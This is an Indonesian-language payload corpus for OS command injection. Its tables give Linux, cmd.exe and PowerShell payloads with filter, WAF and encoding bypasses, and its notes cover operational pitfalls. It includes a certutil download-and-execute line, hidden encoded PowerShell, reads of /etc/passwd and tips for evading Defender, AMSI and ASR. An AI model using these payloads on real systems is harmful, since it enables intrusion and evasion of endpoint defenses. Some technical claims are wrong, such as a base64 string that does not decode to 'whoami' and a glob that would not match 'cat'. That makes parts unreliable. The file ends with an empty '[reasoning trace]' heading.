# w2-cmdi-corpus — web

# Korpus Command Injection — Referensi Payload per OS & Bypass Filter

## 1. Linux / POSIX Shell

### 1.1 Operator dasar & chaining

| # | Payload literal | Dikirim sebagai | Muncul di shell | Target filter yang dilewati |
|---|---|---|---|---|
| 1 | `;id` | `cmd; id` | eksekusi `id` setelah command pertama | filter yang hanya blok `&&`/`\|\|` |
| 2 | `\|id` | pipe | stdout pipe ke `id` | blok `;` tapi tidak pipe |
| 3 | `\|\|id` | OR-list | `id` jalan bila kiri gagal | filter yang blok `&&` saja |
| 4 | `&&id` | AND-list | `id` jalan bila kiri sukses | filter yang blok `;` dan `\|` |
| 5 | `&id` | background + list | `id` di background | filter regex `^[a-zA-Z0-9 ]+$` naif |
| 6 | `` `id` `` | backtick substitution | output `id` inline | filter yang blok `$(` tapi lupa backtick |
| 7 | `$(id)` | command substitution | output inline | filter yang blok backtick saja |
| 8 | `$((16#41))` | arith expansion | `A` (65) | filter yang blok `$(` literal tapi tidak arith |
| 9 | `${IFS}` | var expansion | spasi/tab | filter yang blok spasi literal |
| 10 | `{cat,/etc/passwd}` | brace expansion | `cat /etc/passwd` | filter yang blok spasi / `cat ` literal |
| 11 | `a=/etc/passwd;cat${IFS}$a` | assignment + IFS | baca file | filter yang blok path literal `/etc/passwd` |
| 12 | `cat$IFS/etc/passwd` | IFS tanpa brace | baca file | blok spasi, tidak blok `$IFS` |
| 13 | `cat</etc/passwd` | redirect stdin | baca file | filter yang butuh argumen setelah `cat` |
| 14 | `cat$IFS$9/etc/passwd` | `$9` = positional kosong | separator | blok `$IFS` tanpa `$9`/`$@` |
| 15 | `echo${IFS}id\|sh` | IFS + pipe | eksekusi `id` | blok `\|` + spasi, tidak IFS |
| 16 | `id%0a` | newline URL-encoded | `id\n` | filter line-based (grep per baris) |
| 17 | `id%0d%0a` | CRLF | `id\r\n` | filter yang hanya strip `%0a` |
| 18 | `%09id` | TAB | `\tid` | filter spasi literal, tidak TAB |
| 19 | `$(printf${IFS}"\\x69\\x64")` | hex via printf | `id` | filter blacklist string `id`, `cat`, `whoami` |
| 20 | `$(echo${IFS}aWQ=\|base64${IFS}-d)` | base64 | `id` | blacklist command name literal |
| 21 | `$(echo${IFS}6964\|xxd${IFS}-r${IFS}-p)` | hex→bytes | `id` | blacklist `base64`, `printf` |
| 22 | `/bin/c?t${IFS}/etc/passwd` | glob `?` | `/bin/cat` | blacklist `/bin/cat` literal, allowlist path prefix |
| 23 | `/bin/c[a]t${IFS}/etc/passwd` | glob `[]` | `/bin/cat` | blacklist `cat` substring |
| 24 | `/???/c?t${IFS}/etc/p?sswd` | glob ganda | resolve path | blacklist seluruh path literal |
| 25 | `w\ho\a\m\i` | backslash escape | `whoami` | filter kata `whoami` tanpa normalisasi escape |
| 26 | `wh''oami` | empty-quote concat | `whoami` | blacklist `whoami` literal |
| 27 | `who"$@"ami` | `$@` kosong | `whoami` | blacklist literal + `$IFS`-only |
| 28 | `$'\\x69\\x64'` | ANSI-C quoting | `id` | filter yang hanya lihat `$(` dan backtick |
| 29 | `eval${IFS}$(echo${IFS}aWQ=\|base64${IFS}-d)` | eval + b64 | `id` | blacklist langsung command, tidak `eval` |
| 30 | `sh${IFS}-c${IFS}'id'` | nested shell | `id` | filter yang blok `;`/`\|` tapi izinkan `sh -c` |
| 31 | `x=$'\\x2f\\x62\\x69\\x6e\\x2f\\x69\\x64';$x` | hex var | jalankan `/bin/id` | blacklist path literal |
| 32 | `id${IFS}#` | comment terminator | `id` lalu komentar sisa | filter yang menambahkan suffix `\|\|true` literal |
| 33 | `tac${IFS}/etc/passwd` | alt binary | `tac` | blacklist `cat` only |
| 34 | `/bin/busybox${IFS}cat${IFS}/etc/passwd` | busybox applet | baca file | blacklist `/bin/cat` path |

Catatan eksekusi:
- `$((16#41))` hanya jalan di `bash`/`ksh`, **gagal di `dash`** (default `/bin/sh` di Debian/Ubuntu 24.04) — muncul `arithmetic syntax error`.
- `${IFS}` default = `space + TAB + newline` di bash 5.x; di `sh` POSIX tetap space/TAB.
- `%0a` setelah command di URL: hanya efektif bila backend memecah argumen per baris (mis. `system("grep ".$_GET['q'])` dipanggil lewat `sh -c`), **bukan** bila argumen di-quote `escapeshellarg`.
- `$'...'` ANSI-C quoting **tidak portabel ke `dash`** — gagal dengan `Syntax error: "(" unexpected`.

## 2. Windows `cmd.exe`

Asumsi: Windows 11 24H2, `cmd.exe` build 10.0.26100, `CommandLineToArgvW` parsing.

| # | Payload literal | Dikirim | Muncul | Filter dilewati |
|---|---|---|---|---|
| 1 | `& whoami` | `cmd & whoami` | eksekusi berurutan | filter blok `&&` |
| 2 | `\| whoami` | pipe | pipe | filter blok `&` |
| 3 | `&& whoami` | AND | kondisional | filter blok `&` + `\|` |
| 4 | `\|\| whoami` | OR | kondisional | filter blok `&&` |
| 5 | `^& whoami` | caret escape `&` | literal `&` di argv, lalu reparse | filter regex `[&]` (caret lolos) |
| 6 | `^\| whoami` | caret escape pipe | `\|` → pipe | filter `[\|]` |
| 7 | `^< file` | redirect via caret | `<` literal | filter `<`/`>` |
| 8 | `whoami^` | trailing caret | caret hilang, `whoami` jalan | filter kata terlarang dengan trailing `^` |
| 9 | `%PATH:~0,1%whoami` | var substring | `C:\...` — bukan eksekusi, **dekorasi** | filter kata `whoami` literal (pecah token) |
| 10 | `%COMSPEC% /c whoami` | env var | `cmd.exe /c whoami` | filter kata `cmd`/`cmd.exe` |
| 11 | `%SystemRoot%\System32\whoami.exe` | env var | path absolut | filter path literal |
| 12 | `who^ami` | caret di tengah | `whoami` | filter substring `whoami` |
| 13 | `wh"oami"` | quote concat | `whoami` | filter substring tanpa normalisasi quote |
| 14 | `c:\windows\system32\who^ami.exe` | caret di binary | `whoami.exe` | filter `whoami` substring |
| 15 | `for %i in (whoami) do %i` | FOR loop | `whoami` | filter kata `whoami` (token terpisah) |
| 16 | `for /f %i in ('whoami') do @echo %i` | FOR /f | output | filter `whoami` literal |
| 17 | `set x=whoami&call %x%` | var + call | `whoami` | filter kata command langsung |
| 18 | `set x=who&set y=ami&call %x%%y%` | split var | `whoami` | filter substring |
| 19 | `echo whoami\|cmd` | pipe ke cmd | eksekusi | filter `whoami` di argumen, bukan command slot |
| 20 | `certutil -urlcache -f http://x/a a.bat&a.bat` | LOLBin | download+exec | filter `powershell`/`curl` |
| 21 | `whoami>%TEMP%\o.txt&type %TEMP%\o.txt` | redirect | exfil ke file | filter yang blok pipe ke output |
| 22 | `whoami ^&^& whoami` | caret ganda | `&&` efektif | filter `&&` literal |
| 23 | `cmd /c ^"whoami^"` | quote caret | nested cmd | filter `cmd /c` literal |
| 24 | `%0a` (via `\n` di `cmd /c`) | newline | `cmd` split command | filter yang enkode per-line |
| 25 | `powershell -c "whoami"` | LOLBin substring | eksekusi | filter kata `powershell` (bila case-sensitive) |
| 26 | `po^wershell -c whoami` | caret | `powershell` | filter substring `powershell` |

Catatan:
- `^` hanya "meng-escape" karakter metakarakter **saat parsing `cmd.exe`**; jika argumen diteruskan ke `CreateProcess` sebagai `lpCommandLine` tanpa `cmd /c`, caret **tidak** diinterpretasi dan parsing dilakukan `CommandLineToArgvW` → payload `^&` muncul literal.
- `%PATH:~0,1%` **tidak** mengeksekusi apa pun; ini hanya untuk memecah token blacklist. Klaim "bypass filter via %PATH%" yang umum beredar salah kaprah — yang benar adalah `%COMSPEC%` / `%SystemRoot%` untuk path resolution.
- Windows 11 24H2 memperketat `cmd.exe` untuk `Autorun` registry, tidak memengaruhi parsing injection.

## 3. PowerShell (Windows PowerShell 5.1 & PowerShell 7.4)

| # | Payload literal | Dikirim | Muncul | Filter dilewati |
|---|---|---|---|---|
| 1 | `; whoami` | statement sep | `whoami` | filter `&&` (PS 5.1 tak dukung `&&`) |
| 2 | `$(whoami)` | subexpression | output | filter backtick |
| 3 | `` `whoami `` | backtick escape spasi | ` whoami` | filter leading space |
| 4 | `&('whoami')` | call operator | `whoami` | filter kata `whoami` (di-quote) |
| 5 | `&("wh"+"oami")` | concat + call | `whoami` | filter substring |
| 6 | `iex("who"+"ami")` | Invoke-Expression | `whoami` | filter `iex` literal (pakai `&{...}`) |
| 7 | `&{whoami}` | scriptblock | `whoami` | filter `iex`/`invoke-expression` |
| 8 | `[char]119+[char]104+...\|iex` | char code | `whoami` | filter seluruh string command |
| 9 | `([char[]](119,104,111,97,109,105)-join'')` | char array | `whoami` | filter substring |
| 10 | `-join('wh','oami')\|iex` | join + iex | `whoami` | filter literal |
| 11 | `p^owershell` (dari cmd) | caret (bukan PS) | `powershell` | lihat §2 |
| 12 | `powershell -e <b64>` | `-EncodedCommand` | decode → exec | filter string command di argv (lihat §4) |
| 13 | `$env:ComSpec /c whoami` | env | `cmd /c whoami` | filter kata `cmd` |
| 14 | `whoami #` | comment | `whoami` | filter yang append suffix |
| 15 | `who`+`ami` di variabel | `$a='who';$b='ami';&("$a$b")` | `whoami` | filter substring |
| 16 | `& (Get-Command whoami)` | cmdlet | eksekusi | filter kata langsung |
| 17 | `` who`ami `` | backtick sisip | `whoami` | filter substring tanpa strip backtick |
| 18 | `w`ho`a`m`i` | backtick antar char | `whoami` | filter substring |
| 19 | `. (gcm *hoami)` | dot-source wildcard | `whoami` | filter kata `whoami`/`gcm` |
| 20 | `[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hvYW1p'))\|iex` | b64 in PS | `whoami` | filter string `whoami`, `base64` |

Catatan:
- PowerShell 5.1 di Windows 11 24H2 masih default `wScript`; PowerShell 7.4 (pwsh) memakai parser sama untuk operator `&`, `$(...)`.
- `-EncodedCommand` mengharuskan **UTF-16LE base64**, bukan UTF-8 — payload base64 UTF-8 akan gagal decode (`FormatException`).
- `iex` di PS 7.4 dengan `$PSNativeCommandArgumentPassing` tidak berubah — tetap berjalan.

## 4. Bypass filter tingkat transport

| Teknik | Contoh literal | Dikirim | Efektif bila | Gagal bila |
|---|---|---|---|---|
| URL-encode | `%3Bid` | `;id` | backend decode sebelum concat | WAF decode dulu (double decode) |
| Double URL-encode | `%253Bid` | `%3B` → `;` | backend decode 2× (mis. nginx `proxy_pass` + app) | hanya decode 1× |
| Unicode fullwidth | `；id` (U+FF1B) | — | **tidak** dieksekusi shell | selalu gagal untuk `sh`/`cmd` |
| Newline | `%0a`, `%0d%0a` | `\n` | argumen split `sh -c` per line | `escapeshellarg`/`escapeshellcmd` |
| Null byte | `%00;id` | `\0;id` | C-string truncation (PHP < 5.3.4, lama) | semua PHP ≥ 5.3.4, nginx 1.25 |
| Overlong UTF-8 | `%c0%bb` | `;` | decoder lama (IIS 5/6) | semua stack modern |
| HPP (HTTP Param Pollution) | `?q=a&q=;id` | concat `a;id` | backend concat semua nilai | framework ambil first/last saja |
| Chunked body | transfer-encoding chunked | payload dipecah | WAF rekonstruksi body | WAF block TE |

## 5. Base64-wrap per platform

Linux (bash):
```
bash -c "$(echo aWQ= | base64 -d)"
```
Muncul: `id`. Bypass filter yang blacklist `id`, `cat`, `whoami`, `wget`, `curl`. **Gagal** di `dash` bila target `/bin/sh` → `base64` mungkin tak ada; fallback `openssl base64 -d`.

Windows cmd:
```
powershell -nop -w hidden -e aQBkAA==
```
`aQBkAA==` = UTF-16LE `id\r\n`? — bukan, `aQBk` = `i d` UTF-16LE = `id`. Eksekusi `id` di PowerShell → **CommandNotFoundException** (tidak ada `id.exe` default). Ganti `d2hvb2FtaQ==` = UTF-8 `whoami`, tapi `-e` butuh UTF-16LE: `dwBoAG8AYQBtAGkA`.

PowerShell (in-process):
```
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAG8AYQBtAGkA'))|iex
```

## 6. Wildcard glob — target filter yang dilewati

| Payload | Resolve | Filter dilewati |
|---|---|---|
| `ca?t /etc/passwd` | `/usr/bin/cat` | blacklist string `cat` |
| `/bin/wh?ch id` | `/usr/bin/which` | blacklist `which` |
| `/???/c?t /etc/p?sswd` | `/bin/cat` | blacklist path & filename |
| `c[a]t` | `cat` | blacklist substring `cat` (butuh shell glob aktif) |
| `/bin/l[s] -la` | `ls` | blacklist `ls` |
| `*/*n/c?t` | glob ambiguity, **gagal** jika multiple match → `ambiguous redirect` | — |

Catatan: glob **tidak jalan** jika argumen di-quote (`"ca?t"`) atau jika `sh` dipanggil dengan `set -f` (noglob). PHP `escapeshellarg` → `'ca?t'` → glob mati.

## 7. Tanpa-spasi (`$IFS` / TAB / `${IFS}`)

| Payload | Platform | Hasil |
|---|---|---|
| `cat${IFS}/etc/passwd` | bash/sh | ok |
| `cat$IFS/etc/passwd` | bash/sh | ok (IFS = space tab newline) |
| `cat$IFS$9/etc/passwd` | bash/sh | ok, `$9` = empty positional |
| `cat${IFS:0:1}/etc/passwd` | bash (substring IFS) | `cat /etc/passwd`, `${IFS:0:1}` = space |
| `id%09` | URL | TAB, banyak filter regex `\s` sudah cover |
| `cat</etc/passwd` | sh | redirect, tanpa spasi |
| `{cat,/etc/passwd}` | bash (bukan sh) | brace expansion, **gagal di `dash`** |

## 8. Jebakan operasional (yang bikin gagal di lapangan)

1. **`/bin/sh` bukan bash di Debian/Ubuntu 22.04+/24.04.** `dash` tidak mendukung `$'...'`, `$((16#41))`, brace expansion, `{cat,...}`. Payload bash-only muncul sebagai `Syntax error: "(" unexpected` atau `Bad substitution`. Uji dulu: `echo $0` → `/bin/sh` vs `/bin/bash`.

2. **`escapeshellarg`/`escapeshellcmd`/`proc_open` array** mematikan hampir semua payload di atas. Injection hanya hidup bila: `system("ls ".$_GET['d'])`, `exec("ping -c1 $ip")`, `popen("grep $q file","r")`, `Runtime.exec(String)` di Java, `os.system("cmd "+x)` Python, PHP `shell_exec` dengan concat.

3. **WAF decode-order mismatch.** WAF (Cloudflare, AWS WAF, ModSecurity CRS 3.3+) decode URL **sebelum** regex. `%253B` jadi `%3B` di log WAF tapi `;` di app → bypass hanya jika app decode dua kali. Uji dengan payload canary `%253Bid%2520` dan lihat log 403 vs 200.

4. **Windows `CommandLineToArgvW` vs `cmd /c`.** Caret `^` hanya metakarakter di `cmd.exe`. Jika service (mis. IIS/ASP.NET `Process.Start` tanpa `ShellExecute` atau Java `Runtime.exec`) memanggil binary langsung, `^&` **tidak** jadi `&` — payload `.NET` harus pakai `&` literal atau `"` biasa. Kebalikannya, `cmd /c` menambah satu lapis parsing → payload butuh escape ganda.

5. **PowerShell `-EncodedCommand` strict UTF-16LE.** Base64 UTF-8 (`d2hvb2FtaQ==`) gagal `FormatException` di PS 5.1 dan 7.4. Encoder harus `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))`. Ini penyebab #1 payload PS "tidak jalan padahal tampak benar".

6. **`$IFS` tidak jalan di argumen yang di-quote oleh framework.** Django `subprocess.run(cmd, shell=True)` OK; `subprocess.run(["ls", user_input])` — injection mati total. Flask `os.system(f"grep {q} f")` OK.

7. **Glob di path absolut dengan `*` sering ambiguous.** `*/*n/c?t` bisa match `/bin/cat` atau `/sbin/cat` atau keduanya → `cat: ambiguous redirect` atau eksekusi binary salah. Gunakan `?` per-karakter, bukan `*`, untuk determinisme.

8. **`%0a` tidak selalu split argumen.** Di `cmd.exe` newline tidak memecah command; di PowerShell newline memecah **statement** (jalan), di `sh -c` memecah perintah (jalan), di Java `Runtime.exec(String)` newline **tidak** split (single argv) → gagal.

9. **Filter berbasis allowlist regex** (`^[a-z0-9\s]+$`, `^[\w\-]+$`) mematikan **semua** payload §1–§3 kecuali yang murni alfanumerik — dan hampir tidak ada. Realistis: injection hanya hidup di endpoint yang memang butuh metakarakter (filename, URL, path). Fokus oracle ke parameter tersebut.

10. **`%COMSPEC%` / `%PATH:~0,1%` bukan eksekusi.** Banyak writeup keliru menyebut "bypass via `%PATH%`". Yang benar: `%COMSPEC%` = path ke `cmd.exe`, `%SystemRoot%` = `C:\Windows`. `%PATH:~0,1%` hanya substring pertama `PATH` (`C`) — tidak mengeksekusi apa pun, hanya memecah token blacklist jika digabung, mis. `who%PATH:~7,1%ami` = `whoami` bila char ke-7 PATH = `a`. Verifikasi per-host, jangan asumsi.

11. **Windows Defender & AMSI** memblok `powershell -e`, `iex`, `Invoke-Expression`, `certutil -urlcache` di Windows 11 24H2 dengan signature 2024+. `-nop -w hidden -e` masih sering ke-block di endpoint dengan ASR rule "Block process creations originating from PSExec and WMI commands". Uji dengan `-EncodedCommand` yang dipecah chunk atau `Add-Type` runtime compile.

12. **nginx 1.25 `proxy_pass` + `$uri` normalisasi** decode `%2e%2e`, tapi **tidak** decode `;` di path segment — `;id` di path (`/x;id`) tidak jadi injection kecuali app mem-parsing path segment dengan `;` sebagai delimiter (Tomcat, Java `getPathInfo`). Di Tomcat 10.1, `;` di path di-strip oleh `UrlPathNormalizer` sebelum `getServletPath` — injection gagal.

13. **Base64-wrap di target tanpa `base64`/`openssl`.** Alpine/busybox minimal image sering tidak punya `base64` (ada `busybox base64`), tidak punya `xxd`, tidak punya `printf \x` (busybox `printf` tidak support `\x` tanpa `-e` di beberapa build). Siapkan fallback `od -An -tx1` + `awk`, atau murni shell arith `$((16#id))`.

14. **Shellshock-class var name injection** (`() { :;};`) hanya relevan di bash ≤ 4.3 — semua distro modern sudah patch. Jangan dimasukkan ke korpus live, hanya untuk lab legacy.

15. **`$@`/`$*` separator vs `$9`.** `$@` kosong bila tidak ada positional; `$9` kosong bila <9 arg. Keduanya bekerja sebagai "empty word" untuk memisah token, **tapi** dalam `sh -c 'id$@'` `$@` bisa kosong total → `id` jalan tanpa separator, tetap OK. Di `sh -c 'cat$@/etc/passwd'` → `cat/etc/passwd` (path salah) → **gagal**. Gunakan `${IFS}` untuk separator deterministik.

---

## [reasoning trace]


